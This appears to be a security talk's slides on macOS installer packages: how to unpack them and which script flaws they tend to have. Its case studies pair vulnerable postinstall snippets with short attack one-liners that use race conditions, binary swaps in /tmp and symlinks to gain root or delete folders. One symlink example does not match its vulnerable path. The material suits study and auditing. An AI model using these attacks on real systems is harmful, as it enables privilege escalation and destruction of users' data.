# An In-Depth Look at macOS Installer Packages and Common Security Flaws

## About Me
- **Experience**: 11 years as a professional, 20+ years as a hobbyist
  - Self-taught → Stanford → iSEC Partners → NCC Group
- **Security Consultant**: Focus on application security (AppSec)
  - Individual Contributor (IC) → Management → IC
- **Personal Note**: "Dana Vollmer’s husband" (5x Olympic Gold Medalist)
  - [More Information](http://www.zimbio.com/Hottest+Olympic+Husbands+and+Boyfriends/articles/u_giY9WHdG9/Dana+Vollmer+Husband+Andy+Grant)

## Overview
- **Motivation**
- **The Package**
- **Unpacking**
- **What Can (and Does) Go Wrong**

### Motivation
- **Trust Issues**: Understanding what's really going on inside the packages.
- **Routine Work**: Sometimes there are no other options but to inspect these packages.

### The Package - Outside
- **Mac OS X Installer Flat Package (.pkg extension)**
  - **Documentation**:
    - Little to no official documentation
    - Better unofficial (but incomplete) documentation:
      - [Flat Packages by Matthew Brett](https://matthew-brett.github.io/docosx/flat_packages.html)
      - [Ivanhoe by Stéphane Sudre](http://s.sudre.free.fr/Stuff/Ivanhoe/FLAT.html)
- **eXtensible ARchive (XAR)**
- **Helpful Tools**:
  - `pkgutil` (pre-installed on macOS)
  - [Suspicious Package](https://www.mothersruin.com/software/SuspiciousPackage/)

### Unpacking
- **The Easy Way**:
  ```bash
  pkgutil --expand "/path/to/package.pkg" "/path/to/output/directory"
  ```
- **The Hacker Way**:
  ```bash
  mkdir -p "/path/to/output/directory"
  cd "/path/to/output/directory"
  xar -xf "/path/to/package.pkg"
  ```

### The Package - Inside
- **Directory Structure**:
  ```plaintext
  ├── Distribution         (XML document text, ASCII text)
  ├── Resources            (directory)
  └── .pkg                 (directory)
      ├── Bom               (Mac OS X bill of materials file)
      ├── PackageInfo       (XML document text, ASCII text)
      ├── Payload           (gzip compressed data, from Unix)
      └── Scripts            (gzip compressed data, from Unix)
  ```

### The Package - Distribution, PackageInfo, Bom
- **Distribution (XML + JavaScript)**
  - **Customizations**: Title, welcome text, readme, background, restart, etc.
  - **Script / Installation Checks**: InstallerJS
- **PackageInfo (XML)**
  - **Information on the package**
  - **Install requirements**
  - **Installation location**
  - **Paths to scripts to run**
- **Bill of Materials (BOM)**
  - **List of files**: To install, update, or remove
  - **File attributes**: UNIX permissions, owner/group, size, etc.

### The Package - Payload, Scripts
- **Payload (CPIO archive, gzip)**
  - **Content**: Files to be installed
  - **Extraction**: To the installation location specified in `PackageInfo`
- **Scripts (CPIO archive, gzip)**
  - **Content**: Pre- and post-install scripts and additional resources (Bash, Python, Perl, etc.)
  - **Execution**: Extracted to a random temporary directory for execution

### Unpacking - Scripts
- **Extracting Gzip’d CPIO Files**:
  ```bash
  cat Scripts | gzip -dc | cpio -i
  ```
- **Native CPIO Handling**:
  ```bash
  cpio -i
  ```

### Installation Process
1. **Preinstall Script**: Specified in `PackageInfo`
2. **Extract Payload**: To the installation location from `PackageInfo`
3. **Postinstall Script**: Specified in `PackageInfo`

### What Can Go Wrong?
- **Security Vulnerabilities**:
  - **Scripts**:
    - Preinstall
    - Postinstall
    - Helper scripts
  - **Payload**:
    - Additional scripts (application helpers, uninstall scripts, etc.)
    - Normal native app issues (binary, libraries, kernel modules)

- **Types of Vulnerabilities**:
  - **TOCTOU (Time of Check to Time of Use)**
  - **Unsafe /tmp Directory**:
    - Reads: Unsafe
    - Writes: Unsafe
    - Executes: Unsafe
  - **Insecure Permissions**:
    - `chmod 777`

### Real Vulnerabilities in .pkg Files (Past 8 Months)
- **Root Privilege Escalation**
- **Symlink Abuse**
- **Privilege Escalation**
- **Arbitrary Directory Deletion**
- **Arbitrary Code Execution**

### Case Studies
- **Root Privilege Escalation**:
  - **Vulnerability**:
    ```bash
    sudo /var/tmp/Installerutil --validate_nsbrandingfile "$NSBRANDING_JSON_FILE" "$NSINSTPARAM_JSON_FILE"
    ```
  - **Attack**:
    ```bash
    while [ ! -f /var/tmp/Installerutil ]; do :; done; rm /var/tmp/Installerutil; cp exploit.sh /var/tmp/Installerutil
    ```

- **Symlink Abuse**:
  - **Vulnerability**:
    ```bash
    sudo rm /var/tmp/nsinstallation
    sudo chmod 777 /var/tmp/nsinstallation
    sudo chown "${CONSOLE_USER}" /var/tmp/nsinstallation
    ```
  - **Attack**:
    ```bash
    touch /var/tmp/nsinstallation; while [ -f /var/tmp/nsinstallation ]; do :; done; ln -s /Applications /var/tmp/nsinstallation
    ```

- **Privilege Escalation**:
  - **Vulnerability**:
    ```bash
    rm -rf /tmp/7z
    unzipresult=$(/usr/bin/unzip -q "$APP_FOLDER/7z.zip" -d "/tmp")
    un7zresult=$(/tmp/7z x "${APP_FOLDER}/xy.7z" -o "$APP_FOLDER")
    ```
  - **Attack**:
    ```bash
    cp exploit.sh /tmp/7z
    ```

- **Arbitrary Directory Deletion**:
  - **Vulnerability**:
    ```bash
    # Clean up garbage
    rm -rf /tmp/sdu/*
    rmdir /tmp/sdu/
    ```
  - **Attack**:
    ```bash
    ln -s /Users/victim /var/sdu
    ```

- **Arbitrary Code Execution**:
  - **Vulnerability**:
    ```bash
    cd /tmp/RazerSynapse
    for package in /tmp/RazerSynapse/*.pkg
    do
    installer -pkg "${package}" -target /
    ```
  - **Demo**:
    - [Watch the Demo](https://www.youtube.com/watch?v=OvlSLCVgaMs)

### Malicious Intent
- **No-Payload Packages**:
  - No receipts left behind
  - Minimal clicks, all actions during installation checks
- **Application Whitelisting Bypass**:
  - [Bypassing Google Santa on macOS](https://www.praetorian.com/blog/bypassing-google-santa-application-whitelisting-on-macos-part-1)
  - On macOS, app whitelisting is at the `execve` level, and the installer is whitelisted
  - Code runs via installation checks and pre- and post-install scripts as the installer

### Questions?
- @andywgrant